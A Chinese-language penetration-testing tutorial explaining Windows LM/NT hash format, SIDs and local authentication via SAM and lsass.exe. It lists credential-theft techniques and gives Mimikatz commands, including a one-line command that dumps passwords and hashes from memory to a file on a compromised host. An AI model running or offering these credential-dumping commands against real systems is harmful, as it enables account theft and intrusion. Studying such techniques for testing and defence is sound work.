## 🧠 Windows哈希简介

上一节我们回顾了主机信息收集，本节中我们来看看Windows系统的密码存储核心——哈希。

简单来说，Windows哈希就是Windows系统加密过的密码口令。系统不会明文存储你的密码，而是将其通过特定算法转换成一段固定长度的字符串（哈希值）进行存储。

Windows系统主要使用两种哈希算法对用户密码进行处理：
*   **LM哈希**：一种较老的加密方式，存在安全缺陷。其处理的密码**最大长度为14个字符**。在新版系统中已不推荐使用。
*   **NT哈希（NTLM Hash）**：目前主流的加密方式，安全性更高。它还有NTLMv1和NTLMv2等版本。

在后续内容中，我们将主要关注NT哈希。

## 📝 Windows哈希格式与SID

一个完整的Windows密码哈希通常由LM哈希和NT哈希两部分组成，其格式如下：

![](img/b29e990bfe9624aa3399828377839886_13.png)

![](img/b29e990bfe9624aa3399828377839886_15.png)

![](img/b29e990bfe9624aa3399828377839886_17.png)

```
用户名:RID:LM哈希:NT哈希:::
```

![](img/b29e990bfe9624aa3399828377839886_19.png)

![](img/b29e990bfe9624aa3399828377839886_21.png)

例如：`Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`

![](img/b29e990bfe9624aa3399828377839886_23.png)

![](img/b29e990bfe9624aa3399828377839886_25.png)

以下是核心概念的解析：

![](img/b29e990bfe9624aa3399828377839886_27.png)

*   **用户名**：系统账户名。
*   **RID**：相对标识符，是用户SID的最后一部分，用于在域或本地计算机中唯一标识用户。
*   **LM哈希与NT哈希**：冒号分隔的两部分哈希值。如果LM哈希部分为`aad3b435b51404eeaad3b435b51404ee`，则通常表示该账户未使用LM加密或密码为空。
*   **SID**：安全标识符，是系统中账户的唯一身份证。RID包含在SID中。

![](img/b29e990bfe9624aa3399828377839886_29.png)

![](img/b29e990bfe9624aa3399828377839886_31.png)

我们可以通过系统命令查看当前用户的SID。在命令行中执行：

```cmd
whoami /user
```

或者使用WMI命令查看所有用户：

```cmd
wmic useraccount get name,sid
```

你会发现，同一台机器上用户的SID前半部分相同，区别就在于最后的RID值（例如，Administrator的RID通常是500）。

## 🔐 Windows认证基础

![](img/b29e990bfe9624aa3399828377839886_33.png)

![](img/b29e990bfe9624aa3399828377839886_35.png)

了解哈希的存储格式后，我们来看看系统如何使用它进行认证。Windows认证主要分为三种类型：

1.  **本地认证**：用户直接登录计算机（如输入开机密码）。
2.  **网络认证**：用户远程访问网络中的其他计算机（如访问共享文件夹）。
3.  **域认证**：用户登录到域环境中的计算机。

![](img/b29e990bfe9624aa3399828377839886_37.png)

![](img/b29e990bfe9624aa3399828377839886_39.png)

本节我们重点讲解**本地认证**的过程，它涉及我们稍后要获取密码的关键位置。

本地认证的四个关键步骤如下：

1.  **用户输入密码**：在登录界面输入用户名和密码。
2.  **系统计算哈希**：系统将用户输入的明文密码，通过算法计算成NT哈希值。
3.  **哈希比对**：系统从本地的**SAM数据库**文件中读取对应用户存储的NT哈希值。SAM数据库文件路径为：`C:\Windows\System32\config\SAM`。
4.  **验证结果**：比较计算出的哈希值与SAM中存储的哈希值。如果匹配，则登录成功；否则失败。

在这个过程中，有一个名为 **`lsass.exe`** 的系统进程至关重要。它负责处理用户的身份验证，并且在某些情况下，用户的**明文密码**可能会短暂地出现在这个进程的内存中。这就为我们获取明文密码提供了可能。

![](img/b29e990bfe9624aa3399828377839886_41.png)

![](img/b29e990bfe9624aa3399828377839886_42.png)

我们可以使用Python简单计算一个字符串的NT哈希，来加深理解：

```python
import hashlib
def get_ntlm_hash(text):
    return hashlib.new('md4', text.encode('utf-16le')).hexdigest()
print(get_ntlm_hash('admin'))  # 输出：209c6174da490caeb422f3fa5a7ae634
```

![](img/b29e990bfe9624aa3399828377839886_44.png)

![](img/b29e990bfe9624aa3399828377839886_45.png)

得到的哈希值 `209c6174da490caeb422f3fa5a7ae634` 可以在一些在线哈希解密网站（如cmd5.com）上尝试破解，对于简单密码很容易得到明文`admin`。

![](img/b29e990bfe9624aa3399828377839886_56.png)

![](img/b29e990bfe9624aa3399828377839886_58.png)

1.  **Mimikatz**：功能强大的凭证提取工具，可直接从内存读取密码。
2.  **PowerShell脚本**：利用PowerShell加载特定脚本获取哈希。
3.  **注册表导出与破解**：导出SAM和SYSTEM文件，在本地进行破解。
4.  **Procdump + Mimikatz**：先导出`lsass.exe`进程内存，再离线分析。
5.  **LaZagne**：一款用于获取存储在本地计算机上大量密码的开源应用程序。
6.  **Windows Credential Manager**：获取系统凭据管理器存储的密码。
7.  **浏览器密码提取**：获取Chrome、Firefox等浏览器保存的密码。
8.  **RDP连接凭据获取**：获取远程桌面连接保存的密码。
9.  **WCE（Windows Credentials Editor）**：另一款老牌的内存密码读取工具。
10. **Metasploit & Cobalt Strike**：渗透测试框架中集成的相关模块。

## 🥇 方法一：使用Mimikatz获取凭证

![](img/b29e990bfe9624aa3399828377839886_65.png)

Mimikatz是内网渗透中不可或缺的神器，它能够从`lsass.exe`进程的内存中提取明文密码、哈希值、PIN码和Kerberos票据等。

### 下载与交互式使用

你可以从GitHub（`https://github.com/gentilkiwi/mimikatz`）下载Mimikatz。在获得目标系统管理员权限的命令行后，可以交互式运行它。

```cmd
mimikatz.exe
privilege::debug      # 提升至debug权限，这是提取凭证的前提
token::elevate        # 提升token权限
sekurlsa::logonpasswords full  # 提取内存中的明文密码和哈希
```

![](img/b29e990bfe9624aa3399828377839886_67.png)

### 非交互式（单命令）使用

![](img/b29e990bfe9624aa3399828377839886_69.png)

![](img/b29e990bfe9624aa3399828377839886_70.png)

在实际渗透中，更常用一条命令完成所有操作：

![](img/b29e990bfe9624aa3399828377839886_72.png)

```cmd
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "exit" > log.txt
```

![](img/b29e990bfe9624aa3399828377839886_74.png)

这条命令依次执行了：提权、提升Token、提取密码，并将结果输出到`log.txt`文件中。
